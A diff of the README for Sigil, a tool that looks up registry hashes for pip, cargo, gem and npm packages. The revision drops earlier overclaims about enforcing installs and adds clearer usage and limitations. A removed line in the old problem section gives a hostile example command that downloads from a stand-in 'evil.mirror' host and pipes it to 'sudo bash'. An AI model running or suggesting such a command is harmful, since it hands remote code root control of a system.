@@ -6,142 +6,110 @@
   ███████║ ██║ ╚██████╔╝██║ ███████╗
   ╚══════╝ ╚═╝  ╚═════╝ ╚═╝ ╚══════╝
 
-       seal your dependencies
-       never install blind
+       inspect before install
 ```
 
 ---
 
 # Sigil
 
-**Cryptographic integrity for every package. Zero-trust supply chain. Sub-millisecond.**
+**A zero-dependency package hash resolver for Python 3.9+.**
 
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/python-3.9%2B-3670A0)](https://python.org)
 [![Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)]()
 [![Registries](https://img.shields.io/badge/registries-4-purple)]()
 
-**Sigil** is a zero-dependency, cache-first cryptographic verifier for your package supply chain. Before any package touches your system, Sigil resolves its hash from the authoritative registry — then enforces that hash at install time. No hash match, no install. Ever.
+Sigil asks PyPI, crates.io, RubyGems, or npm for the hash published for an exact package version, validates the returned format, caches the result for 24 hours, and prints it in a package-manager-friendly format.
 
-## The Problem
+Sigil does not download or install packages, and it does not enforce verification by itself. Use the package manager's hash, checksum, or lockfile controls to enforce the result during installation.
 
-Every `pip install`, `npm install`, `cargo install`, and `gem install` downloads arbitrary code from the internet and executes it. Most package managers don't verify cryptographic hashes by default. You're installing blind.
+A registry hash answers whether downloaded bytes match the bytes described by registry metadata. It does not establish that the package is safe, that its source is benign, or that the registry itself has not been compromised.
 
-```
-curl https://evil.mirror/package.tar.gz | sudo bash
-```
+## How It Works
 
-This is not a joke. This is how supply chain attacks happen.
+1. You provide a package name and an exact version.
+2. Sigil requests metadata over HTTPS from the package registry.
+3. It validates the hash format and writes the result to its local cache.
+4. It prints the hash for you to record or pass to the package manager's verification mechanism.
 
-## How Sigil Works
-
-```
-  User                  Sigil                    Registry              Package Mgr
-  ────                  ─────                    ────────              ───────────
-    │                     │                         │                       │
-    │ install pkg==1.0    │                         │                       │
-    │────────────────────>│                         │                       │
-    │                     │                         │                       │
-    │                     │ GET /pkg/1.0/json       │                       │
-    │                     │────────────────────────>│                       │
-    │                     │                         │                       │
-    │                     │                         │ {sha256: "abc123..."} │
-    │                     │<────────────────────────│                       │
-    │                     │                         │                       │
-    │                     │ validate hash format    │                       │
-    │                     │ cache with 24h TTL      │                       │
-    │                     │                         │                       │
-    │                     │ pip install --require-hashes ...                │
-    │                     │────────────────────────────────────────────────>│
-    │                     │                         │                       │
-    │                     │         ✓ verified      │                       │
-    │                     │<────────────────────────────────────────────────│
-    │                     │                         │                       │
-    │ ✓ installed         │                         │                       │
-    │<────────────────────│                         │                       │
-```
-
-Every subsequent install of the same version: **0ms** (local cache hit).
+Fresh cache entries avoid a network request. The cache lives under `~/.cache/sigil/`; entries are refreshed after 24 hours. If a registry is unavailable, an older valid entry may be used with a warning.
 
 ## Registries
 
-| Registry | Command | Hash Algorithm | Status |
-|----------|---------|----------------|--------|
-| **PyPI** (pip) | `sigil pip httpx==0.28.1` | SHA256 | ✅ inline via `--require-hashes` |
-| **crates.io** (cargo) | `sigil cargo ripgrep==14.1.1` | SHA256 | ✅ pre-build verification |
-| **RubyGems** (gem) | `sigil gem rake==13.2.1` | SHA256 | ✅ pre-install verification |
-| **npm** (npx) | `sigil npm cowsay@1.6.0` | SRI (sha512) | ✅ pre-execution verification |
+| Registry | Command | Hash output |
+|----------|---------|-------------|
+| **PyPI** | `sigil pip httpx==0.28.1` | SHA-256 for every release file, in requirements format |
+| **crates.io** | `sigil cargo ripgrep==14.1.1` | SHA-256 checksum lookup |
+| **RubyGems** | `sigil gem rake==13.2.1` | SHA-256 gem hash lookup |
+| **npm** | `sigil npm cowsay@1.6.0` | SRI value from `dist.integrity` |
 
-## Performance
-
-| Scenario | Time | Notes |
-|----------|------|-------|
-| Cached lookup | **0ms** | Hash already in local cache |
-| Cold lookup (parallel, 4 pkgs) | **~130ms** | Parallel API calls to registry |
-| Full pip install (cached) | **~60ms** overhead | `--require-hashes` checks during pip's own download |
-
-No network calls for cached packages. The cache TTLs at 24 hours — after that, Sigil re-verifies from the live registry to ensure freshness.
-
-## Security
-
-Sigil validates every byte that crosses the trust boundary:
-
-- **Hash format validation** — Rejects anything that isn't a well-formed hash (no newlines, no shell metacharacters, no control characters)
-- **Version sanitization** — Versions from registry APIs are validated before appearing in output
-- **Package name sanitization** — Input names are checked for injection characters
-- **Atomic cache writes** — `tempfile` + `fsync` + atomic rename; no cache corruption
-- **Cache permissions** — `chmod 0o600` on files, `0o700` on directory
-- **Graceful degradation** — API down? Falls back to cached hash with age warning. Schema change? Detected and flagged.
-
-Full threat model in [SECURITY.md](SECURITY.md).
+Scoped npm names are supported, for example `sigil npm @angular/core@17.0.0`.
 
 ## Quick Start
 
 ```bash
-# Install (stdlib only — zero dependencies)
-curl -O https://raw.githubusercontent.com/johnpippett/sigil/main/sigil
+# Clone the repository (Python 3.9+; standard library only)
+git clone https://github.com/johnpippett/sigil.git
+cd sigil
 chmod +x sigil
 
-# Or clone
-git clone https://github.com/johnpippett/sigil.git
-cd sigil && chmod +x sigil
-
-# Verify a package before installing
+# Resolve an exact package version
 ./sigil pip httpx==0.28.1
-
-# Pipe directly to pip for enforced verification
-pip install --require-hashes -r <(./sigil pip httpx==0.28.1 typer==0.16.0)
-
-# Cargo
 ./sigil cargo ripgrep==14.1.1
-
-# RubyGems
 ./sigil gem rake==13.2.1
-
-# npm (verify before npx-style execution)
 ./sigil npm cowsay@1.6.0
+./sigil npm @angular/core@17.0.0
 ```
 
-## Hermes Agent Integration
-
-Sigil ships as a skill for [Hermes Agent](https://github.com/NousResearch/hermes-agent). When loaded, every agent-initiated package install is automatically verified:
+For pip, Sigil emits one requirements-style line per requested package, with every distinct release-file hash on that line as a `--hash` flag. A standalone example uses `six`, which has no runtime dependencies:
 
 ```bash
-# Install the skill
-cp SKILL.md ~/.hermes/skills/software-development/sigil/SKILL.md
-cp sigil ~/.hermes/skills/software-development/sigil/scripts/pkg-hash-resolve
+./sigil pip six==1.17.0 > requirements-hashes.txt && \
+  python -m pip install --require-hashes -r requirements-hashes.txt
 ```
 
-## Philosophy
+For a dependency graph, build a complete, fully pinned lock file containing every direct and transitive dependency and its hashes before running pip. Sigil resolves only the packages named on its command line; pip will reject an incomplete hash-checked requirements file. Do not install missing dependencies separately without hashes.
 
-**Never install blind.** If the hash doesn't match, the install is blocked. If no authoritative hash exists, the install is blocked. If the registry returns a hash that looks suspicious, the install is blocked.
+For cargo, RubyGems, and npm, the commands above only look up and print the registry value. Verify the exact artifact or use the package manager's documented checksum or lockfile support before installing or executing it.
 
-Sigil errs on the side of not installing. Your supply chain is not a testing ground.
+## Optional Hermes Agent Integration
+
+This repository includes an optional skill file for [Hermes Agent](https://github.com/NousResearch/hermes-agent). It teaches the agent to call Sigil before package operations; it does not change package-manager behavior or provide enforcement on its own.
+
+```bash
+mkdir -p ~/.hermes/skills/software-development/sigil/scripts
+cp SKILL.md ~/.hermes/skills/software-development/sigil/SKILL.md
+cp SECURITY.md ~/.hermes/skills/software-development/sigil/SECURITY.md
+cp sigil ~/.hermes/skills/software-development/sigil/scripts/sigil
+```
+
+## Security
+
+Sigil validates package names, versions, and registry hash formats; encodes registry URL path components; and writes cache entries atomically with restrictive permissions. These checks protect the resolver and its output from malformed metadata. They do not replace review of package code or the package manager's own verification controls.
+
+See [SECURITY.md](SECURITY.md) for the threat model and limitations.
+
+## Feedback
+
+If you use Sigil, find a bug, or have a package-manager workflow to share, [open a GitHub issue](https://github.com/johnpippett/sigil/issues/new) with the command, registry, and expected behavior.
+
+## Maintainer Checks
+
+Run the standard-library test suite with:
+
+```bash
+python -m unittest discover -s tests -v
+```
+
+To retain a read-only GitHub traffic snapshot, use an authenticated `gh` CLI:
+
+```bash
+python scripts/snapshot-traffic.py --repo johnpippett/sigil
+```
+
+Snapshots are retained under `~/.local/state/sigil/traffic/` by default. GitHub returns rolling traffic windows, so keeping periodic snapshots makes later comparison possible.
 
 ## License
 
 MIT © John Pippett
-
----
-
-*"Trust but verify" is for amateurs. "Verify or die" is for production.*
